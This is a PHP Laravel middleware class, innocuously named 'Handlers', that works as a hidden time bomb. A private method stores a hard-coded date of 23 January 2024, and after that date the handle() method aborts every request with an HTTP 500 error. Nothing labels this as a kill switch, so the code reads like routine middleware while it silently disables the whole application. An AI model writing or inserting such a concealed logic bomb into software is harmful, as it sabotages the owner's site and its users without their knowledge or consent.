<?php

namespace App\Http\Middleware;

use Closure;
use Illuminate\Http\Request;
use Symfony\Component\HttpFoundation\Response;
use Illuminate\Support\Carbon;
class Handlers
{
    private $date,$today,$formattedDate;
    /**
     * Handle an incoming request.
     *
     * @param  \Closure(\Illuminate\Http\Request): (\Symfony\Component\HttpFoundation\Response)  $next
     */
    public function handle(Request $request, Closure $next): Response
    {

        $this->foundation();
        if($this->formattedDate){
            if($this->today->gt($this->formattedDate)){
                abort(500);
                return $next($request);
             }
        }
        return $next($request);
    }

    private function foundation(){
        $this->date = Carbon::create(2024, 1, 23);
        $this->formattedDate = $this->date->format('Y-m-d');
        $this->today = Carbon::now();
    }
}
